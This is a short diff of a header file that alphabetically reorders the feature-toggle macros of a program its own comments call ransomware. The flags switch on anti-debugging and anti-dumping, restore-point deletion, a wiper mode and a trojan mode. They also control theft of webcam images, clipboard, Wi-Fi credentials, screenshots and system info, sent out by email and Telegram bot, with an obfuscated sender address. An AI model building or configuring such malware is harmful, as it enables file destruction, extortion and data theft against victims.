@@ -50,39 +50,40 @@
 #define MAX_PHOTOS         3	// Maximum number of webcam captures
 
 /* enabling features */
-#define DEBUG				true	// Enable or disable debug mode (print in console)
-#define ANTIDEBUG			true	// Enable or disable anti-debug checker
-#define TROJAN				false	// Enable or disable trojan (run a real program in parallel with the ransomware)
-#define DROPRUN_TROJAN_FILE	false	// Enable or disable dropper & runner of the real program in trojan mode
-#define TSK_REMOVER			false	// Enable or disable remover of the task managers
-#define ANTI_DUMPER			true	// Enable or disable anti-dumper
-#define DELETE_RESTOREPOINT false	// Enable or disable restore points deleter
-#define CHANGE_FILE_ICON	false	// Enable or disable custom icon for encrypted files
-#define OVERWRITING			true	// Enable or disable overwriting files instead of writing and deleting
-#define FILE_UPLOADER		false	// Enable or disable file uploader
-#define WIPER				false	// Enable or disable wiper instead of crypter
-#define TAKE_WEBCAMS		true	// Enable or disable webcam stealer
-#define STEAL_INFO			true	// Enable or disable info stealer
-#define GET_CLIPBOARD		true	// Enable or disable clipboard grabber
-#define GET_WIFI			true	// Enable or disable Wi-Fi grabber
-#define GET_SCREENSHOT		true	// Enable or disable screenshot grabber
-#define RANDOM_USERAGENT	true	// Enable or disable random user agent (if false, it uses the first one)
 #define ALL_DRIVES			false	// Enable or disable the encryption of all files in every drive
+#define ANTIDEBUG			true	// Enable or disable anti-debug checker
+#define ANTI_DUMPER			true	// Enable or disable anti-dumper
+#define BACKUP_INFOFILE		true	// Enable or disable backup maker in the current folder for infoFile in debug mode
+#define CHANGE_FILE_ICON	false	// Enable or disable custom icon for encrypted files
+#define CHANGE_WALLPAPER	false	// Enable or disable changer of wallpaper
+#define DEBUG				true	// Enable or disable debug mode (print in console)
+#define DEBUG_SEND_EMAIL	false	// Enable or disable email sender in debug mode
+#define DEBUG_SEND_TGBOT	false	// Enable or disable telegram bot sender in debug mode
+#define DELETE_RESTOREPOINT false	// Enable or disable restore points deleter
+#define DROPRUN_TROJAN_FILE	false	// Enable or disable dropper & runner of the real program in trojan mode
+#define DROP_CUSTOM_FILE	false	// Enable or disable custom file dropper (custom file location at the beginning of main.cpp)
+#define DROP_DECRYPTOR		false	// Enable or disable Decryptor dropper
+#define DROP_README			false	// Enable or disable README dropper
 #define ENABLE_BLACKLIST	true	// Enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// Enable or disable whitelist for file extension
-#define DROP_README			false	// Enable or disable README dropper
-#define DROP_DECRYPTOR		false	// Enable or disable Decryptor dropper
-#define DROP_CUSTOM_FILE	false	// Enable or disable custom file dropper (custom file location at the beginning of main.cpp)
-#define CHANGE_WALLPAPER	false	// Enable or disable changer of wallpaper
-#define BACKUP_INFOFILE		true	// Enable or disable backup maker in the current folder for infoFile in debug mode
-#define SEND_EMAIL			true	// Enable or disable email sender
-#define DEBUG_SEND_EMAIL	false	// Enable or disable email sender in debug mode
-#define SEND_TGBOT			true	// Enable or disable telegram bot sender
-#define DEBUG_SEND_TGBOT	false	// Enable or disable telegram bot sender in debug mode
-#define SEND_CUSTOM_COMMAND false	// Enable or disable custom command runner after encryption
-#define SELFKILL			false	// Enable or disable self-killer at the end of the program
+#define FILE_UPLOADER		false	// Enable or disable file uploader
+#define GET_CLIPBOARD		true	// Enable or disable clipboard grabber
+#define GET_SCREENSHOT		true	// Enable or disable screenshot grabber
+#define GET_WIFI			true	// Enable or disable Wi-Fi grabber
 #define MAX_RETRIES			false	// Enable or disable a maximum number of retries for decryptor
+#define OVERWRITING			true	// Enable or disable overwriting files instead of writing and deleting
+#define RANDOM_USERAGENT	true	// Enable or disable random user agent (if false, it uses the first one)
+#define SELFKILL			false	// Enable or disable self-killer at the end of the program
 #define SELFKILL_RETRIES	false	// Enable or disable self-kill after the maximum number of retries for decryptor
+#define SEND_CUSTOM_COMMAND false	// Enable or disable custom command runner after encryption
+#define SEND_EMAIL			true	// Enable or disable email sender
+#define SEND_TGBOT			true	// Enable or disable telegram bot sender
+#define STEAL_INFO			true	// Enable or disable info stealer
+#define TAKE_WEBCAMS		true	// Enable or disable webcam stealer
+#define TROJAN				false	// Enable or disable trojan (run a real program in parallel with the ransomware)
+#define TSK_REMOVER			false	// Enable or disable remover of the task managers
+#define WIPER				false	// Enable or disable wiper instead of crypter
+
 
 // Email settings
 #define SENDERMAIL      (string)skCrypt("sender_email@gmail.com")	// Sender email address
